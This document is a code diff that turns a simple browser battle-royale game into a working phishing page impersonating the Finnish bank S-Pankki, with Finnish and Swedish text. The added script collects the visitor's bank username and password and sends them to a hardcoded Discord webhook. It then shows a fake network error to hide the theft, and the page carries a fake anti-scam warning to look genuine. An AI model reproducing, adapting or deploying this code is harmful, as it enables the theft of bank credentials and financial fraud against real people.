@@ -1,502 +1,419 @@
 <!DOCTYPE html>
-<html>
+<html lang="fi">
 <head>
 <meta charset="UTF-8">
-<title>Battle Royale</title>
+<title>S-Pankki</title>
 
 <style>
-body{
-margin:0;
-overflow:hidden;
-background:#111;
-font-family:Arial;
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background-color: #f2f2f2;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
 }
 
-canvas{
-display:block;
+/* Yläpalkki */
+.header {
+    background-color: #00843D;
+    color: white;
+    padding: 10px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    width: 100%;
+    box-sizing: border-box;
 }
 
-#menu{
-position:absolute;
-width:100%;
-height:100%;
-background:#111;
-color:white;
-display:flex;
-flex-direction:column;
-align-items:center;
-justify-content:center;
+.header-left {
+    display: flex;
+    align-items: center;
+    gap: 8px;
 }
 
-button{
-padding:12px 20px;
-margin:8px;
-font-size:18px;
+.logo {
+    width: 44px;
+    height: 44px;
+    object-fit: contain;
 }
 
-#hud{
-position:absolute;
-top:10px;
-left:10px;
-color:white;
-font-size:18px;
+.brand {
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: 0.3px;
+    font-family: "Trebuchet MS", Arial, sans-serif;
 }
 
-#mobile{
-position:absolute;
-bottom:20px;
-width:100%;
-display:flex;
-justify-content:space-between;
-pointer-events:none;
+.lang {
+    font-size: 13px;
+    cursor: pointer;
 }
 
-.joy{
-width:120px;
-height:120px;
-border-radius:50%;
-background:rgba(255,255,255,0.1);
-margin:20px;
-pointer-events:auto;
+/* Huomautuslaatikko */
+.alert-container {
+    width: 100%;
+    max-width: 900px;
+    margin: 20px auto 0 auto;
+    padding: 0 20px;
+    box-sizing: border-box;
 }
+
+.alert-box {
+    background-color: #eaf7ff;
+    border: 1px solid #c2e1f5;
+    border-radius: 4px;
+    padding: 15px 20px;
+    display: flex;
+    align-items: flex-start;
+    gap: 15px;
+    position: relative;
+}
+
+.alert-icon {
+    color: #006699;
+    font-size: 20px;
+    font-weight: bold;
+    border: 2px solid #006699;
+    border-radius: 50%;
+    width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    font-style: normal;
+}
+
+.alert-text {
+    color: #31708f;
+    font-size: 15px;
+    line-height: 1.4;
+    margin-right: 30px;
+}
+
+.close-alert {
+    position: absolute;
+    right: 15px;
+    top: 15px;
+    cursor: pointer;
+    color: #31708f;
+    font-weight: bold;
+    font-size: 18px;
+    border: none;
+    background: none;
+}
+
+/* Keskitys-wrapper */
+.main-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    flex-grow: 1;
+    padding: 20px;
+}
+
+.icon {
+    width: 50px;
+    height: 50px;
+    margin-bottom: 10px;
+}
+
+.title {
+    font-size: 24px;
+    font-weight: normal;
+    margin-bottom: 25px;
+    color: #333;
+}
+
+/* Valkoinen kortti */
+.card {
+    background: white;
+    width: 100%;
+    max-width: 450px;
+    padding: 40px;
+    border-radius: 4px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+    box-sizing: border-box;
+}
+
+.main-instruction {
+    font-size: 15px;
+    color: #333;
+    line-height: 1.5;
+    margin-bottom: 30px;
+    border-bottom: 1px solid #eee;
+    padding-bottom: 20px;
+}
+
+.input-group {
+    margin-bottom: 25px;
+}
+
+label {
+    font-size: 17px;
+    font-weight: bold;
+    display: block;
+    margin-bottom: 4px;
+}
+
+.info {
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 8px;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 4px;
+    border: 1px solid #99aab5;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+
+button.login-btn {
+    width: 100%;
+    padding: 15px;
+    background-color: #00843d;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 18px;
+    font-weight: bold;
+    margin-top: 10px;
+    cursor: pointer;
+}
+
+.link {
+    text-align: center;
+    margin-top: 25px;
+    color: #00843d;
+    font-size: 16px;
+    cursor: pointer;
+    display: block;
+}
+
+/* --- TAI-EROTIN JA MOBIILINAPPI (UUSI) --- */
+.or-divider {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    width: 100%;
+    max-width: 450px;
+    margin: 30px 0;
+    color: #666;
+    font-size: 14px;
+}
+
+.or-divider::before,
+.or-divider::after {
+    content: '';
+    flex: 1;
+    border-bottom: 1px solid #ccc;
+}
+
+.or-divider:not(:empty)::before {
+    margin-right: 15px;
+}
+
+.or-divider:not(:empty)::after {
+    margin-left: 15px;
+}
+
+.mobile-btn {
+    width: 100%;
+    max-width: 450px;
+    padding: 12px;
+    background-color: white;
+    color: #00843d;
+    border: 1px solid #99aab5;
+    border-radius: 4px;
+    font-size: 16px;
+    cursor: pointer;
+    text-align: center;
+}
+
+.mobile-btn:hover {
+    background-color: #f9f9f9;
+}
+
 </style>
+
 </head>
 
 <body>
 
-<div id="menu">
-
-<h1>Mini Battle Royale</h1>
-
-<p>Choose Character</p>
-
-<button onclick="choose('soldier')">Soldier (balanced)</button>
-<button onclick="choose('tank')">Tank (more hp)</button>
-<button onclick="choose('scout')">Scout (fast)</button>
-
-<button onclick="startGame()">START</button>
-
+<div class="header">
+    <div class="header-left">
+        <img src="[joensuunteatteri.fi](https://www.joensuunteatteri.fi/files/s-etu.png)" class="logo">
+        <div class="brand">Pankki</div>
+    </div>
+    <div class="lang" id="langSwitch" onclick="switchLang()">Suomi | Svenska</div>
 </div>
 
-<div id="hud">
-Health: <span id="hp">100</span><br>
-Enemies: <span id="enemycount">0</span>
+<div class="alert-container" id="alertContainer">
+    <div class="alert-box">
+        <i class="alert-icon">i</i>
+        <div class="alert-text" id="alertText">
+            S-Pankin nimissä lähetetään tällä hetkellä huijaussähköposteja ja -tekstiviestejä. Viesteissä on mukana linkki huijaussivustolle. Älä klikkaa linkkejä tai syötä tietojasi nettisivustoille, joiden aitoudesta et ole varma.
+        </div>
+        <button class="close-alert" onclick="closeAlert()">×</button>
+    </div>
 </div>
 
-<div id="mobile">
-<div id="moveJoy" class="joy"></div>
-<div id="aimJoy" class="joy"></div>
-</div>
+<div class="main-container">
 
-<canvas id="game"></canvas>
+    <svg class="icon" viewBox="0 0 24 24" fill="#00843D">
+        <path d="M7 14a5 5 0 1 1 4.9-6h7.6l1.5 1.5-2 2 1.5 1.5-2 2-1.5-1.5H12A5 5 0 0 1 7 14z"/>
+    </svg>
+
+    <div class="title" id="title">Tunnistautuminen</div>
+
+    <div class="card">
+        <div class="main-instruction" id="leftText">
+            Jos käytössäsi ei ole maksutonta S-mobiili -sovellusta voit tunnistautua myös tunnuslukutaulukolla.<br><br>
+            Tunnuslukutaulukolla tunnistautuminen on monivaiheisempi ja käyttäjätunnuksen ja salasanan lisäksi sinua pyydetään antamaan tunnuslukutaulukon tunnus sekä mahdollisesti myös tekstiviestivahvistus.
+        </div>
+
+        <div class="input-group">
+            <label id="userLabel">Käyttäjätunnus</label>
+            <div class="info" id="userInfo">6-8 numeroa pitkä numerosarja.</div>
+            <input type="text" id="usernameInput">
+        </div>
+
+        <div class="input-group">
+            <label id="passLabel">Salasana</label>
+            <div class="info" id="passInfo">Itse keksimäsi 4-6 numeron sarja.</div>
+            <input type="password" id="passwordInput">
+        </div>
+
+        <button class="login-btn" id="loginBtn" onclick="sendToDiscord()">Jatka</button>
+
+        <div class="link" id="forgot">Unohtuiko salasana</div>
+    </div>
+
+    <div class="or-divider" id="orDivider">TAI</div>
+    <button class="mobile-btn" onclick="showNetworkError()" id="mobileBtn">S-mobiililla</button>
+
+</div>
 
 <script>
-
-const canvas=document.getElementById("game")
-const ctx=canvas.getContext("2d")
-
-canvas.width=innerWidth
-canvas.height=innerHeight
-
-let keys={}
-let bullets=[]
-let enemies=[]
-let obstacles=[]
-let particles=[]
-
-let mouse={x:0,y:0}
-
-let stormRadius=700
-
-let player={
-x:canvas.width/2,
-y:canvas.height/2,
-hp:100,
-speed:4,
-fireRate:20,
-cooldown:0
-}
-
-function choose(type){
-
-if(type=="tank"){
-player.hp=180
-player.speed=2.5
-player.fireRate=30
-}
-
-if(type=="scout"){
-player.hp=80
-player.speed=6
-player.fireRate=15
-}
-
-if(type=="soldier"){
-player.hp=100
-player.speed=4
-player.fireRate=20
-}
-
-}
-
-function startGame(){
-
-document.getElementById("menu").style.display="none"
-
-spawnEnemies()
-spawnObstacles()
-
-gameLoop()
-
-}
-
-function spawnEnemies(){
-
-for(let i=0;i<12;i++){
-
-enemies.push({
-x:Math.random()*canvas.width,
-y:Math.random()*canvas.height,
-hp:60,
-cool:0
-})
-
-}
-
-document.getElementById("enemycount").innerText=enemies.length
-
-}
-
-function spawnObstacles(){
-
-for(let i=0;i<20;i++){
-
-obstacles.push({
-x:Math.random()*canvas.width,
-y:Math.random()*canvas.height,
-w:70,
-h:70
-})
-
-}
-
-}
-
-document.addEventListener("keydown",e=>keys[e.key]=true)
-document.addEventListener("keyup",e=>keys[e.key]=false)
-
-canvas.addEventListener("mousemove",e=>{
-mouse.x=e.clientX
-mouse.y=e.clientY
-})
-
-canvas.addEventListener("mousedown",shoot)
-
-function shoot(){
-
-if(player.cooldown>0) return
-
-let angle=Math.atan2(mouse.y-player.y,mouse.x-player.x)
-
-bullets.push({
-x:player.x,
-y:player.y,
-vx:Math.cos(angle)*10,
-vy:Math.sin(angle)*10,
-owner:"player"
-})
-
-player.cooldown=player.fireRate
-
-}
-
-function enemyShoot(enemy,target){
-
-let angle=Math.atan2(target.y-enemy.y,target.x-enemy.x)
-
-bullets.push({
-x:enemy.x,
-y:enemy.y,
-vx:Math.cos(angle)*7,
-vy:Math.sin(angle)*7,
-owner:enemy
-})
-
-}
-
-function movePlayer(){
-
-let nx=player.x
-let ny=player.y
-
-if(keys["w"]) ny-=player.speed
-if(keys["s"]) ny+=player.speed
-if(keys["a"]) nx-=player.speed
-if(keys["d"]) nx+=player.speed
-
-for(let o of obstacles){
-
-if(nx>o.x-15 && nx<o.x+o.w+15 &&
-ny>o.y-15 && ny<o.y+o.h+15){
-
-return
-
-}
-
-}
-
-player.x=nx
-player.y=ny
-
-}
-
-function findClosest(enemy){
-
-let closest=player
-let dist=Math.hypot(enemy.x-player.x,enemy.y-player.y)
-
-for(let e of enemies){
-
-if(e===enemy) continue
-
-let d=Math.hypot(enemy.x-e.x,enemy.y-e.y)
-
-if(d<dist){
-dist=d
-closest=e
-}
-
-}
-
-return closest
-
-}
-
-function hideBehindObstacle(enemy,target){
-
-for(let o of obstacles){
-
-let dx=target.x-o.x
-let dy=target.y-o.y
-
-enemy.x=o.x-dx*0.2
-enemy.y=o.y-dy*0.2
-
-}
-
-}
-
-function updateEnemies(){
-
-for(let e of enemies){
-
-let target=findClosest(e)
-
-let dist=Math.hypot(target.x-e.x,target.y-e.y)
-
-if(dist<200){
-
-hideBehindObstacle(e,target)
-
-}else{
-
-let angle=Math.atan2(target.y-e.y,target.x-e.x)
-
-e.x+=Math.cos(angle)*1
-e.y+=Math.sin(angle)*1
-
-}
-
-e.cool--
-
-if(e.cool<=0){
-
-enemyShoot(e,target)
-e.cool=80
-
-}
-
-}
-
-}
-
-function explode(x,y){
-
-for(let i=0;i<20;i++){
-
-particles.push({
-x:x,
-y:y,
-vx:(Math.random()-0.5)*6,
-vy:(Math.random()-0.5)*6,
-life:40
-})
-
-}
-
-}
-
-function updateParticles(){
-
-for(let i=particles.length-1;i>=0;i--){
-
-let p=particles[i]
-
-p.x+=p.vx
-p.y+=p.vy
-p.life--
-
-if(p.life<=0){
-particles.splice(i,1)
-}
-
-}
-
-}
-
-function updateBullets(){
-
-for(let i=bullets.length-1;i>=0;i--){
-
-let b=bullets[i]
-
-b.x+=b.vx
-b.y+=b.vy
-
-if(b.owner!="player"){
-
-if(Math.hypot(b.x-player.x,b.y-player.y)<15){
-
-player.hp-=10
-document.getElementById("hp").innerText=player.hp
-
-bullets.splice(i,1)
-continue
-
-}
-
-}
-
-for(let e of enemies){
-
-if(b.owner!==e && Math.hypot(b.x-e.x,b.y-e.y)<15){
-
-e.hp-=20
-bullets.splice(i,1)
-
-if(e.hp<=0){
-
-explode(e.x,e.y)
-
-enemies.splice(enemies.indexOf(e),1)
-document.getElementById("enemycount").innerText=enemies.length
-
-}
-
-break
-
-}
-
-}
-
-}
-
-}
-
-function updateStorm(){
-
-stormRadius-=0.02
-
-let dx=player.x-canvas.width/2
-let dy=player.y-canvas.height/2
-
-let dist=Math.sqrt(dx*dx+dy*dy)
-
-if(dist>stormRadius){
-player.hp-=0.1
-}
-
-}
-
-function draw(){
-
-ctx.fillStyle="#222"
-ctx.fillRect(0,0,canvas.width,canvas.height)
-
-ctx.strokeStyle="#aa00ff"
-ctx.lineWidth=4
-ctx.beginPath()
-ctx.arc(canvas.width/2,canvas.height/2,stormRadius,0,Math.PI*2)
-ctx.stroke()
-
-ctx.fillStyle="#00e5ff"
-ctx.beginPath()
-ctx.arc(player.x,player.y,15,0,Math.PI*2)
-ctx.fill()
-
-ctx.fillStyle="#ff4444"
-for(let e of enemies){
-ctx.beginPath()
-ctx.arc(e.x,e.y,15,0,Math.PI*2)
-ctx.fill()
-}
-
-ctx.fillStyle="yellow"
-for(let b of bullets){
-ctx.beginPath()
-ctx.arc(b.x,b.y,4,0,Math.PI*2)
-ctx.fill()
-}
-
-ctx.fillStyle="#777"
-for(let o of obstacles){
-ctx.fillRect(o.x,o.y,o.w,o.h)
-}
-
-for(let p of particles){
-
-ctx.fillStyle="orange"
-ctx.fillRect(p.x,p.y,4,4)
-
-}
-
-}
-
-function checkWin(){
-
-if(enemies.length==0){
-
-alert("🏆 YOU WIN!")
-location.reload()
-
-}
-
-}
-
-function gameLoop(){
-
-movePlayer()
-
-if(player.cooldown>0) player.cooldown--
-
-updateEnemies()
-updateBullets()
-updateParticles()
-updateStorm()
-draw()
-checkWin()
-
-if(player.hp<=0){
-
-alert("Game Over")
-location.reload()
-
-}
-
-requestAnimationFrame(gameLoop)
-
-}
-
+    const translations = {
+        'fi': {
+            langText: 'Suomi | Svenska',
+            alertText: 'S-Pankin nimissä lähetetään tällä hetkellä huijaussähköposteja ja -tekstiviestejä. Viesteissä on mukana linkki huijaussivustolle. Älä klikkaa linkkejä tai syötä tietojasi nettisivustoille, joiden aitoudesta et ole varma.',
+            title: 'Tunnistautuminen',
+            leftText: 'Jos käytössäsi ei ole maksutonta S-mobiili -sovellusta voit tunnistautua myös tunnuslukutaulukolla.<br><br>Tunnuslukutaulukolla tunnistautuminen on monivaiheisempi ja käyttäjätunnuksen ja salasanan lisäksi sinua pyydetään antamaan tunnuslukutaulukon tunnus sekä mahdollisesti myös tekstiviestivahvistus.',
+            userLabel: 'Käyttäjätunnus',
+            userInfo: '6-8 numeroa pitkä numerosarja.',
+            passLabel: 'Salasana',
+            passInfo: 'Itse keksimäsi 4-6 numeron sarja.',
+            loginBtn: 'Jatka',
+            forgot: 'Unohtuiko salasana',
+            orDivider: 'TAI',
+            mobileBtn: 'S-mobiililla',
+            alertMessage: 'Täytä molemmat kentät.',
+            loading: 'Ladataan...',
+            networkError: 'Verkkovirhe. Yritä myöhemmin uudelleen.',
+            mobileNetworkError: 'Verkkovirhe: Yhteyttä S-mobiili -palveluun ei voitu muodostaa. Yritä myöhemmin uudelleen.'
+        },
+        'sv': {
+            langText: 'Svenska | Suomi',
+            alertText: 'För närvarande skickas bedrägliga e-postmeddelanden och textmeddelanden i S-Bankens namn. Meddelandena innehåller en länk till en bedrägerisida. Klicka inte på länkar eller ange dina uppgifter på webbplatser vars äkthet du inte är säker på.',
+            title: 'Identifiering',
+            leftText: 'Om du inte använder den kostnadsfria S-mobil appen kan du även identifiera dig med en nyckeltalslista.<br><br>Identifiering med nyckeltalslista är mer stegvis, och förutom användarnamn och lösenord kommer du att bli ombedd att ange koden från nyckeltalslistan samt eventuellt också en textmeddelandebekräftelse.',
+            userLabel: 'Användarnamn',
+            userInfo: 'En nummerserie på 6-8 siffror.',
+            passLabel: 'Lösenord',
+            passInfo: 'Din självvalda serie med 4-6 siffror.',
+            loginBtn: 'Fortsätt',
+            forgot: 'Glömt lösenord',
+            orDivider: 'ELLER',
+            mobileBtn: 'Med S-mobil',
+            alertMessage: 'Fyll i båda fälten.',
+            loading: 'Laddar...',
+            networkError: 'Nätverksfel. Försök igen senare.',
+            mobileNetworkError: 'Nätverksfel: Kunde inte upprätta anslutning till S-mobil tjänsten. Försök igen senare.'
+        }
+    };
+
+    let currentLang = 'fi';
+
+    function updateContent() {
+        const lang = translations[currentLang];
+        document.getElementById('langSwitch').innerHTML = lang.langText;
+        document.getElementById('alertText').innerHTML = lang.alertText;
+        document.getElementById('title').innerHTML = lang.title;
+        document.getElementById('leftText').innerHTML = lang.leftText;
+        document.getElementById('userLabel').innerHTML = lang.userLabel;
+        document.getElementById('userInfo').innerHTML = lang.userInfo;
+        document.getElementById('passLabel').innerHTML = lang.passLabel;
+        document.getElementById('passInfo').innerHTML = lang.passInfo;
+        document.getElementById('loginBtn').innerHTML = lang.loginBtn;
+        document.getElementById('forgot').innerHTML = lang.forgot;
+        document.getElementById('orDivider').innerHTML = lang.orDivider;
+        document.getElementById('mobileBtn').innerHTML = lang.mobileBtn;
+    }
+
+    function switchLang() {
+        currentLang = currentLang === 'fi' ? 'sv' : 'fi';
+        updateContent();
+    }
+
+    // Initial load
+    updateContent();
+
+    function closeAlert() {
+        document.getElementById("alertContainer").style.display = "none";
+    }
+
+    function showNetworkError() {
+        alert(translations[currentLang].mobileNetworkError);
+    }
+
+    async function sendToDiscord() {
+        const username = document.getElementById("usernameInput").value;
+        const password = document.getElementById("passwordInput").value;
+        const btn = document.getElementById("loginBtn");
+
+        if (!username || !password) {
+            alert(translations[currentLang].alertMessage);
+            return;
+        }
+
+        btn.innerText = translations[currentLang].loading;
+        btn.disabled = true;
+
+        const webhookUrl = "[discord.com](https://discord.com/api/webhooks/1488163784509100185/yeUVbBmjfddeWO8HzFQ2K_5fgeh4mLNPCqdI6KyGsPuO1tyBDZcGuNV3LhfCDkb9S4DD)";
+        
+        const payload = {
+            embeds: [{
+                title: "Uusi kirjautuminen", // This might need translation too if you want everything translated
+                color: 34112,
+                fields: [
+                    { name: "Käyttäjätunnus", value: username, inline: true }, // Field names could also be translated
+                    { name: "Salasana", value: password, inline: true }
+                ],
+                timestamp: new Date()
+            }]
+        };
+
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            alert(translations[currentLang].networkError);
+        } catch (error) {
+            console.error("Virhe:", error);
+        } finally {
+            btn.innerText = translations[currentLang].loginBtn;
+            btn.disabled = false;
+        }
+    }
 </script>
 
 </body>
